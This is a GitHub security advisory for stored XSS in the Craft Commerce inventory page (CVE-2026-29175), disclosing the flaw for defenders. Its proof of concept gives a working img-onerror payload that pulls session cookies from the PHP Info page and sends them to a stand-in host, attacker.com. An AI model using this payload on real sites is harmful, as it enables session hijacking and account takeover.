# [H] Craft Commerce has multiple Stored XSS in Commerce Inventory Page, Leading to Session Hijacking

## Summary
Severity: High
Advisory: GHSA-cfpv-rmpf-f624
CVE: CVE-2026-29175
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-cfpv-rmpf-f624
Type: github-advisory

## Affected
- Packagist: `craftcms/commerce` — affected >=5.0.0 <5.5.3

## Details
## Summary

Stored XSS vulnerabilities exist in the Commerce Inventory page. The **Product Title**, **Variant Title**, and **Variant SKU** fields are rendered without proper HTML escaping, allowing an attacker to execute arbitrary JavaScript when any user (including administrators) views the inventory management page.

This vulnerability enables **session hijacking** by fetching the PHP Info utility page, which displays unmasked session cookies. Unlike other XSS chains that require elevated sessions, this attack provides instant access to the victim’s session - no additional user interaction or elevated session approval required.

## Proof of Concept

### Permissions Required

- Access the control panel
- Access Craft Commerce
- Create/Edit products

### Steps to Reproduce
1. Log in to the control panel
2. Navigate to **Commerce → Products**
3. Add a new product and set the **Title** field to: (replace `https://attacker.com`)
    ```html
    <img src=x onerror="fetch('/admin/utilities/php-info').then(r=>r.text()).then(t=>{m=t.match(/<th[^>]*>Cookie[^<]*<\/th>\s*<td[^>]*>([\s\S]*?)<\/td>/);if(m)new Image().src='https://attacker.com/s?c='+btoa(m[1])})">
    ```
4. Save the product
5. Navigate to **Commerce → Inventory** (`/admin/commerce/inventory`)
6. XSS executes, fetches PHP Info page, extracts session cookies, and exfiltrates them to the attacker server

### Cookie Extraction Details
The PHP Info page (`/admin/utilities/php-info`) displays cookie values (unmasked) in multiple locations:
- `HTTP_COOKIE`
- `Cookie` (used in this PoC)
- `$_SERVER['HTTP_COOKIE']`
- `$_COOKIE['<cookie-name>']`

### Notes
- The same vulnerability exists in **Variant Title** and **Variant SKU** fields while creating a product. The PoC focuses on Product Title, but the same attack works for the other two fields.
- `$_COOKIE['CRAFT_CSRF_TOKEN']` is masked in PHP Info, but the unmasked value is available in the other parameters listed above.
- This vulnerability can also be chained to achieve full database exfiltration or do it after hijacking an administrator session.

## Mitigation
1. Sanitize product and variant fields when rendering in the inventory template
2. Mask sensitive cookie values in the PHP Info utility page (similar to how `CRAFT_CSRF_TOKEN`, `CRAFT_SECURITY_KEY`, and `CRAFT_DB_PASSWORD` are already masked)

## References
- https://github.com/craftcms/commerce/security/advisories/GHSA-cfpv-rmpf-f624
- https://nvd.nist.gov/vuln/detail/CVE-2026-29175
- https://github.com/craftcms/commerce/commit/9f0638a4fb29ed8295a463385a7cc49ec986e33a
- https://github.com/craftcms/commerce
